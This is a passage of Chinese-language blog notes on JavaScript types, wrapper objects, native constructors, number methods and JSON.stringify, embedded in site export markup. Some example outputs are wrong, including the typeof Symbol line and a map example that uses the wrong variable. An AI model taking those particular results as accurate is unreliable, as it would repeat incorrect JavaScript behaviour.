Undefined]&quot;</span><br></pre></td></tr></table></figure><p></p><p>虽然Null和undefined这样的原声构造函数不存在，但是内部Class属性值仍然是Null和Undefined。基本类型值被各自的封装对象自动包装，所以他们的内部[[Class]]属性值为Boolean。</p><h4 id=\"封装对象包装\"><a href=\"#封装对象包装\" class=\"headerlink\" title=\"封装对象包装\"></a>封装对象包装</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &quot;abc&quot;;</span><br><span class=\"line\">console.log(a);\t\t// &quot;abc&quot;</span><br><span class=\"line\">a.length \t\t\t\t\t// &quot;3&quot;</span><br><span class=\"line\">var b = new String(&quot;abc&quot;)</span><br><span class=\"line\">console.log(b)\t\t// String &#123;[[PrimitiveValue]]: &quot;abc&quot;&#125; 0:&quot;a&quot; 1:&quot;b&quot; 2:&quot;c&quot; length:3 __proto__:String [[PrimitiveValue]]:&quot;abc&quot;</span><br></pre></td></tr></table></figure><p>只是创建字面量基本值的时候，并没有其他的方法。当在使用其对象方法时，需要通过封装对象才能访问，此时js会自动为基本类型值包装(box或者wrap)一个封装对象。<br>但是为经常用到的.length方法直接new一个对象也不是一个好办法，因为浏览器对.length这样的常见情况做了优化，直接使用封装对象来“提前优化”反而会降低执行效率。</p><h4 id=\"封装对象的释疑\"><a href=\"#封装对象的释疑\" class=\"headerlink\" title=\"封装对象的释疑\"></a>封装对象的释疑</h4><p>例如：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new Boolean(false);</span><br><span class=\"line\">if (!a)&#123;</span><br><span class=\"line\">\tconsole.log(...)\t\t\t// 执行不到这里</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>因为建立一个a之后，这个对象得到的是真值，得到的结果和使用false相反</p><p>自行封装可以使用Object<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &quot;abc&quot;</span><br><span class=\"line\">var b = new String (a);</span><br><span class=\"line\">var c = Object(a);</span><br><span class=\"line\">typeof a \t\t\t\t// &quot;stirng&quot;</span><br><span class=\"line\">typeof b\t\t\t\t// &quot;object&quot;</span><br><span class=\"line\">typeof c\t\t\t\t// &quot;object&quot;</span><br><span class=\"line\">b instanceof String \t// true</span><br><span class=\"line\">c instanceof String \t// true</span><br><span class=\"line\">Object.prototype.toString.call(b);\t\t// &quot;[object String]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(c);\t\t// &quot;[object String]&quot;</span><br></pre></td></tr></table></figure><p></p><p>一般不直接使用封装对象，但是他们偶尔也会派上用场</p><h4 id=\"拆封\"><a href=\"#拆封\" class=\"headerlink\" title=\"拆封\"></a>拆封</h4><p>如果想得到封装对象里面的值，可以使用valueOf函数，隐式拆封也是调用了valueOf函数：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new String(&quot;abc&quot;)</span><br><span class=\"line\">var b = new Number(11)</span><br><span class=\"line\">var c = new Boolean(true)</span><br><span class=\"line\">a.valueOf()\t// &quot;abc&quot;</span><br><span class=\"line\">b.valueOf()\t// 11</span><br><span class=\"line\">c.valueOf()\t// true</span><br><span class=\"line\">var d = a + &quot;&quot;;</span><br><span class=\"line\">console.log(d)\t\t\t\t// &quot;abc&quot;</span><br><span class=\"line\">typeof a \t\t\t// &quot;object&quot;</span><br><span class=\"line\">typeof d \t\t\t// &quot;string&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"原生函数作为构造函数\"><a href=\"#原生函数作为构造函数\" class=\"headerlink\" title=\"原生函数作为构造函数\"></a>原生函数作为构造函数</h4><p>四种方式创建应该尽量避免构造函数，除非十分必要</p><ul><li>array 数组</li><li>object 对象</li><li>function 函数</li><li>RegExp 正则表达式<h3 id=\"ARRAY\"><a href=\"#ARRAY\" class=\"headerlink\" title=\"ARRAY(..)\"></a>ARRAY(..)</h3>调用Array构造函数时，可以不需要加上new，效果一致。）且Array构造函数纸袋一个数字作为参数的时候，这个参数会当作数组的预设长度，而不是充当其中的一个元素<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 效果一致</span><br><span class=\"line\">var a = new Array(1,2,3);</span><br><span class=\"line\">a\t\t\t// [1,2,3]</span><br><span class=\"line\">var b = Array(1,2,3)</span><br><span class=\"line\">b \t\t// [1,2,3]</span><br><span class=\"line\">var c = [1,2,3]</span><br><span class=\"line\">c \t\t// [1,2,3]</span><br><span class=\"line\">// 不同方式创建出来空数组效果不一致</span><br><span class=\"line\">var d = new Array(3);</span><br><span class=\"line\">console.log(d)\t\t\t// chrome上： (3) [empty × 3]</span><br><span class=\"line\">d.length\t\t\t\t\t\t// 3</span><br><span class=\"line\">var e = [undefined,undefined,undefined];</span><br><span class=\"line\">console.log(e)\t\t\t// (3) [undefined, undefined, undefined]</span><br><span class=\"line\">var f = []\t\t\t\t\t</span><br><span class=\"line\">f.length = 3;</span><br><span class=\"line\">console.log(f);\t\t\t// chrome上： (3) [empty × 3]</span><br><span class=\"line\">// 直接以，创建。虽然长度是3令人费解，但是可以更好的复制粘贴</span><br><span class=\"line\">var g = [,,,]</span><br><span class=\"line\">console.log(g)\t\t\t// chrome上： (3) [empty × 3]</span><br></pre></td></tr></table></figure></li></ul><p>由于创建方式不同，导致在chrome下不一致的显示，但是更难过的是，他们有时相同，有时呵呵<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new Array(3)</span><br><span class=\"line\">var b = [undefined,undefined,undefined]</span><br><span class=\"line\">a.join(&quot;-&quot;)\t\t\t// &quot;--&quot;</span><br><span class=\"line\">b.join(&quot;-&quot;)\t\t\t// &quot;--&quot;</span><br><span class=\"line\">a.map(function(v,i)&#123;return i&#125;)\t\t// (3) [empty × 3]</span><br><span class=\"line\">a.map(function(v,i)&#123;return i&#125;)\t\t// [0, 1, 2]</span><br></pre></td></tr></table></figure><p></p><p>a.map之所以执行失败，是因为a中是没有元素的，而b里面有undefied。<br><strong>而join首先假定数组不为空，然后通过length属性值来便利其中的元素，而map并不做这种假定</strong><br>可以通过这种方式来创建包含undefined单元的数组<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = Array.apply(null, &#123;length:3&#125;);</span><br><span class=\"line\">console.log(a)\t\t\t// (3) [undefined, undefined, undefined]</span><br></pre></td></tr></table></figure><p></p><p><em>PS:永远不要创建和使用空单元数组</em></p><h4 id=\"OBJECT、FUNCTION、REGEXP\"><a href=\"#OBJECT、FUNCTION、REGEXP\" class=\"headerlink\" title=\"OBJECT、FUNCTION、REGEXP\"></a>OBJECT、FUNCTION、REGEXP</h4><p><strong>除非玩不得已，尽量不要使用他们</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var c = new Object();</span><br><span class=\"line\">c.foo = &quot;bar&quot;;</span><br><span class=\"line\">c\t\t\t\t// &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">var d = &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">d\t\t\t\t// &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">var e = new Function(&quot;a&quot;,&quot;return a * 2&quot;);</span><br><span class=\"line\">var f = function(a)&#123;return a*2&#125;;</span><br><span class=\"line\">function g(a)&#123;return a*2&#125;</span><br><span class=\"line\">var h = new RegExp(&quot;^a*b+&quot;,&quot;g&quot;);</span><br><span class=\"line\">var i = /^a*b+/g</span><br></pre></td></tr></table></figure><p></p><p>javascript对常量形式的代码会对他们进行预编译和缓存！</p><h4 id=\"DATE、ERROR\"><a href=\"#DATE、ERROR\" class=\"headerlink\" title=\"DATE、ERROR\"></a>DATE、ERROR</h4><p>相较于其他原生构造函数，Date、Error的用处比其他的更多，因为没有其他对用的常量形式来作为他们的替代<br>引入生成当前时间戳，使用<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Date.now()</span><br><span class=\"line\">// 使用new来生成时间</span><br><span class=\"line\">new Date()</span><br><span class=\"line\">// Thu Jan 04 2018 06:47:59 GMT+0800 (CST)</span><br></pre></td></tr></table></figure><p></p><p>错误对象通常与throw一起使用<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(x)&#123;</span><br><span class=\"line\">\tif(!x)&#123;</span><br><span class=\"line\">\t\tthrow new Error(&quot;///&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// -</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"SYMBOL\"><a href=\"#SYMBOL\" class=\"headerlink\" title=\"SYMBOL\"></a>SYMBOL</h4><p>Symbol可作为私有属性是一种简单标量基本类型</p><h3 id=\"强制类型转换\"><a href=\"#强制类型转换\" class=\"headerlink\" title=\"强制类型转换\"></a>强制类型转换</h3><h4 id=\"抽象值操作\"><a href=\"#抽象值操作\" class=\"headerlink\" title=\"抽象值操作\"></a>抽象值操作</h4><p>如果对象有自己的toString()方法，字符串化就会调用该方法并使用其返回值。<br>数组的默认toString方法经过了重新定义<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [1,2,3]</span><br><span class=\"line\">a.toString()\t\t// &quot;1,2,3&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"JSON-字符串化\"><a href=\"#JSON-字符串化\" class=\"headerlink\" title=\"JSON 字符串化\"></a>JSON 字符串化</h4><p>JSON.stringify(42) // “42”<br>JSON.stringify(“42”) // “”42””<br>JSON.stringify(null) // “null”<br>JSON.stringify(true) // “true”</p><p><em>JSON.stringify()在对象中遇到undefined、function和symbol时会自动将其忽略，在数组中则会返回null</em><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify(undefined)\t\t\t// undefined</span><br><span class=\"line\">JSON.stringify(function()&#123;&#125;)\t// undefined</span><br><span class=\"line\">JSON.stringify([1,undefined, function()&#123;&#125;,4])\t// &quot;[1,null,null,4]&quot;</span><br><span class=\"line\">JSON.stringify(&#123;a:2, b: function()&#123;&#125;&#125;)\t\t\t\t// &quot;&#123;&quot;a&quot;:2&#125;&quot;</span><br></pre></td></tr></table></figure><p></p><p>循环引用会出错<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = &#123;&#125;;</span><br><span class=\"line\">var a = &#123;</span><br><span class=\"line\">\tb:42,</span><br><span class=\"line\">\tc:o,</span><br><span class=\"line\">\td:function()&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">o.e = a</span><br><span class=\"line\">JSON.stringify(a)</span><br><span class=\"line\">a.toJSON=function()&#123;</span><br><span class=\"line\">\treturn &#123;b:this.b&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">JSON.stringify(a)</span><br><span class=\"line\"># Uncaught TypeError: Converting circular structure to JSON</span><br><span class=\"line\">#     at JSON.stringify (&lt;anonymous&gt;)</span><br><span class=\"line\">#     at &lt;anonymous&gt;:8:6</span><br></pre></td></tr></table></figure><p></p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h3><h4 id=\"七个内置类型\"><a href=\"#七个内置类型\" class=\"headerlink\" title=\"七个内置类型\"></a>七个内置类型</h4><ul><li>空值 (null)</li><li>未定义 (undefined)</li><li>布尔值 (boolean)</li><li>数字 (number)</li><li>字符串 (string)</li><li>对象 (object)</li><li>符号 (symbol)</li></ul><h4 id=\"检测各个类型\"><a href=\"#检测各个类型\" class=\"headerlink\" title=\"检测各个类型\"></a>检测各个类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof undefined\t\t=== &quot;undefined&quot; \t// true</span><br><span class=\"line\">typeof true \t\t\t\t=== &quot;boolean&quot;\t\t\t// true</span><br><span class=\"line\">typeof 42\t\t\t\t\t\t=== &quot;number&quot;\t\t\t// true</span><br><span class=\"line\">typeof &quot;42&quot; \t\t\t\t=== &quot;string&quot;\t\t\t// true</span><br><span class=\"line\">typeof &#123;&quot;life&quot;: 42&#125;\t=== &quot;object&quot;\t\t\t// true</span><br><span class=\"line\">typeof Symbol\t\t\t\t=== &quot;symbol&quot;\t\t\t// true</span><br><span class=\"line\">typeof null \t\t\t\t=== &quot;object&quot;\t\t\t// true</span><br><span class=\"line\">typeof function()&#123;&#125;\t=== &quot;function&quot; \t\t// true</span><br><span class=\"line\">typeof [0,1]\t\t\t\t=== &quot;object&quot;\t\t\t// true</span><br></pre></td></tr></table></figure><p>本身null对象里面代表空值，所以其为object也是合理。但应该typeof null 返回是 null才符合常理。由于这个bug在许多代码中已经这样做了，所以重新修回会导致更严重的bug。因此被修回的可能性很小。<br>因此，对null应该采用复合查询语句<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = null;</span><br><span class=\"line\">(!a &amp;&amp; typeof a === &quot;object&quot;)\t// true</span><br></pre></td></tr></table></figure><p></p><p>而对于typeof function(){} === “function” 而言，因为本身function是object的一个子类型，具体的说，函数是一个可调用对象。<br>且typeof [0,1] === “object”,因为数组也是object的一个子类型</p><p><em>ps：由于所有的typeof都会返回一个string，所以 typeof typeof 42会是”string”，因为typeof 42首先会变成一个“number”，是一个string类型，所以typeof “number”是一个string</em></p><h4 id=\"undefined-amp-amp-undeclared-amp-amp-typeof-undeclared\"><a href=\"#undefined-amp-amp-undeclared-amp-amp-typeof-undeclared\" class=\"headerlink\" title=\"undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared\"></a>undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\">typeof a;\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">var b = 42;</span><br><span class=\"line\">var c;</span><br><span class=\"line\">b=c;</span><br><span class=\"line\">typeof c\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">typeof b\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">a\t\t\t\t\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">d\t\t\t\t\t\t\t// &quot;VM422:1 Uncaught ReferenceError: d is not defined at &lt;anonymous&gt;:1:1&quot;</span><br></pre></td></tr></table></figure><p>从上述可以看出，undefined 和 undeclared 是两码事。undefined意思是定义但未赋值，或者赋值为undefined，而undeclared是未定义。因此两者不能画等号</p><h4 id=\"typeof-undeclared\"><a href=\"#typeof-undeclared\" class=\"headerlink\" title=\"typeof undeclared\"></a>typeof undeclared</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof a\t\t\t// &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>出现这种原因因为typeof有一个特殊的安全防范机制，因为多个脚本文件会在共享的全局变量命名空间中加载变量。如果typeof一个未命名的报错，会导致整段程序停止运行。对于typeof来检查undeclared变量，有时是一个不错的办法。</p><h4 id=\"值\"><a href=\"#值\" class=\"headerlink\" title=\"值\"></a>值</h4><h5 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h5><p>js的数组可以容纳任何的值，甚至可以是另一个数组，因此多维数组就是这种方式来实现的。<br>由于数组本身就是一个特殊的对象，所以数组也可以包含字符串键值和属性，但是这并不计算在数组长度内。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [];</span><br><span class=\"line\">a[0] = 1;</span><br><span class=\"line\">a[&quot;foobar&quot;] = 1;</span><br><span class=\"line\">a.length \t\t\t// 1</span><br><span class=\"line\">a[&quot;foobar&quot;];\t// 1</span><br><span class=\"line\">a.foobar\t\t\t// 1</span><br><span class=\"line\">a[&quot;13&quot;] = 42;</span><br><span class=\"line\">a.length\t\t// 14</span><br></pre></td></tr></table></figure><p></p><p>为什么会这样呢？由于本身数组就是一个对象的子集合，因此在[]中，使用十进制字符串数字会直接强制类型转化成数字。a[“13”]就变成了a[13],因此在数组内会直接将其长度变化成14。同理，在属性给foobar加到a数组中，因为数组的界定是有数字来确定下标位置，而length是最后一个下标数字+1，因而加入的非数字就不在长度里面了。</p><h5 id=\"类数组\"><a href=\"#类数组\" class=\"headerlink\" title=\"类数组\"></a>类数组</h5><p>对于es5而言，可以用slice,concat来实现类数组转数组，对于es6而言，可以用Array.from()来实现从类数组转换成数组。</p><h5 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h5><p>字符串的一些方法indexOf(),concat(),toUpperCase(),reverse()等等。<br>字符串的一些方法：<br>|方法|描述|<br>|—|—|<br>|charAt() | 返回指定索引位置的字符|<br>|charCodeAt() | 返回指定索引位置字符的 Unicode 值|<br>|concat() | 连接两个或多个字符串，返回连接后的字符串|<br>|fromCharCode() | 将 Unicode 转换为字符串|<br>|indexOf() | 返回字符串中检索指定字符第一次出现的位置|<br>|lastIndexOf() | 返回字符串中检索指定字符最后一次出现的位置|<br>|localeCompare() | 用本地特定的顺序来比较两个字符串|<br>|match() | 找到一个或多个正则表达式的匹配|<br>|replace() | 替换与正则表达式匹配的子串|<br>|search() | 检索与正则表达式相匹配的值|<br>|slice() | 提取字符串的片断，并在新的字符串中返回被提取的部分|<br>|split() | 把字符串分割为子字符串数组|<br>|substr() | 从起始索引号提取字符串中指定数目的字符|<br>|substring() | 提取字符串中两个指定的索引号之间的字符|<br>|toLocaleLowerCase() | 根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLocaleUpperCase() | 根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLowerCase() | 把字符串转换为小写|<br>|toString() | 返回字符串对象值|<br>|toUpperCase() | 把字符串转换为大写|<br>|trim() | 移除字符串首尾空白|<br>|valueOf() | 返回某个字符串对象的原始值|</p><p>如果需要经常一字符数组的方式来处理字符串的话，倒不如直接用数组。这样就不用在字符串和数组之间来回折腾。可以在有需要的时候使用join(“”)来将字符串数组转换为字符串</p><h4 id=\"数字\"><a href=\"#数字\" class=\"headerlink\" title=\"数字\"></a>数字</h4><p>和大部分编程语言一样，js中的数字是基于IEE754标准来实现的。该标准通常也被称为“浮点数”。而js使用的是双精度单位(64位)格式。所以也会有iee754标准的通病，即浮点数之间相加会有奇妙的现象。<br>数字的一些方法：<br>toExponential()<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 5E10\t\t\t// 可以通过这种方式赋值</span><br><span class=\"line\">a\t\t\t\t\t\t\t\t\t// 50000000000</span><br><span class=\"line\">a.toExponential()\t// &quot;5e+10&quot;</span><br><span class=\"line\">var b = a * a;</span><br><span class=\"line\">b \t\t\t\t\t\t\t\t// 2.5e+21</span><br><span class=\"line\">```\t</span><br><span class=\"line\">toFixed()\t\t\t\t\t// 精度</span><br><span class=\"line\">```bash</span><br><span class=\"line\">var a = 42.59</span><br><span class=\"line\">a.toFixed(1)\t\t\t// &quot;42.6&quot;</span><br><span class=\"line\">// 无效</span><br><span class=\"line\">42.toFixed(3)\t\t\t// Uncaught SyntaxError: Invalid or unexpected token</span><br><span class=\"line\">// 有效</span><br><span class=\"line\">42..toFixed(3)\t\t// &quot;42.000&quot;</span><br><span class=\"line\">(42).toFixed(3)\t\t// &quot;42.000&quot;</span><br><span class=\"line\">0.42.toFixed(3)\t\t// &quot;0.420&quot;</span><br><span class=\"line\">42 .toFixed(3)\t\t// &quot;42.000&quot;</span><br></pre></td></tr></table></figure><p></p><p>因为.被视为常量42.的一部分。所以没有.属性访问运算符来调用toFixed()<br>toPrecision() // 执行有效位数的显示位数<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 42.59</span><br><span class=\"line\">a.toPrecision(1)\t\t// &quot;4e+1&quot;</span><br><span class=\"line\">a.toPrecision(2)\t\t// &quot;43&quot;</span><br><span class=\"line\">a.toPrecision(3)\t\t// &quot;42.6&quot;</span><br><span class=\"line\">``` </span><br><span class=\"line\">es6支持新格式</span><br><span class=\"line\">```bash</span><br><span class=\"line\">0B\t\t0b\t\t\t\t\t// 二进制</span><br><span class=\"line\">0O\t\t0o\t\t\t\t\t// 八进制</span><br><span class=\"line\">0X\t\t0x\t\t\t\t\t// 十六进制</span><br></pre></td></tr></table></figure><p></p><p>EPSILON // 最小精度<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(((0.1 + 0.2) - 0.3)&lt;Number.EPSILON)&#123;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>MAX_VALUE<br>MAX_SAFE_INTEGER<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.MAX_VALUE\t\t\t\t\t\t// 1.7976931348623157e+308</span><br><span class=\"line\">Number.MAX_SAFE_INTEGER\t\t\t// 9007199254740991</span><br></pre></td></tr></table></figure><p></p><p>isInteger<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.isInteger(1)\t\t\t\t\t// true</span><br><span class=\"line\">Number.isInteger(1.1)\t\t\t\t// false</span><br><span class=\"line\">Number.isInteger(1.0)\t\t\t\t// true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"特殊数值\"><a href=\"#特殊数值\" class=\"headerlink\" title=\"特殊数值\"></a>特殊数值</h4><h5 id=\"undefined\"><a href=\"#undefined\" class=\"headerlink\" title=\"undefined\"></a>undefined</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var undefined = 2</span><br><span class=\"line\">undefined \t// 2</span><br></pre></td></tr></table></figure><p><em>ps：永远不要重新定义undefined</em></p><h4 id=\"void-运算符\"><a href=\"#void-运算符\" class=\"headerlink\" title=\"void 运算符\"></a>void 运算符</h4><p>在不需要返回值的时候，可以void掉<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(ready)&#123;</span><br><span class=\"line\">\treturn void setTimeout(..)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这样做可以将setTimeout返回的id给void掉</p><h4 id=\"NaN\"><a href=\"#NaN\" class=\"headerlink\" title=\"NaN\"></a>NaN</h4><p>NaN是一个数值型。意思指的是不是一个数值，并且NaN != NaN。可以使用isNaN来判断是否是NaN<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.isNaN(NaN)\t\t\t\t// true</span><br><span class=\"line\">Number.isNaN(1)\t\t\t\t\t// false</span><br></pre></td></tr></table></figure><p></p><h4 id=\"0值\"><a href=\"#0值\" class=\"headerlink\" title=\"0值\"></a>0值</h4><p>加法和减法运算永远不会有-0<br>使用toString和JSON.stringify()会将-0变成0<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0/-1\t\t\t// -0</span><br><span class=\"line\">0/1\t\t\t\t// 0</span><br><span class=\"line\">var a = -0</span><br><span class=\"line\">a \t\t\t\t// -0</span><br><span class=\"line\">a.toString()\t\t// 0</span><br><span class=\"line\">JSON.stringify(a)\t// 0</span><br></pre></td></tr></table></figure><p></p><h4 id=\"特殊等式\"><a href=\"#特殊等式\" class=\"headerlink\" title=\"特殊等式\"></a>特殊等式</h4><p>Object.is<br>Object.is 可以判断是+0还是-0,而且可以判断是否为NaN<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.is(+0, -0)\t// false</span><br><span class=\"line\">Object.is(NaN, NaN)\t\t// true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"值和引用\"><a href=\"#值和引用\" 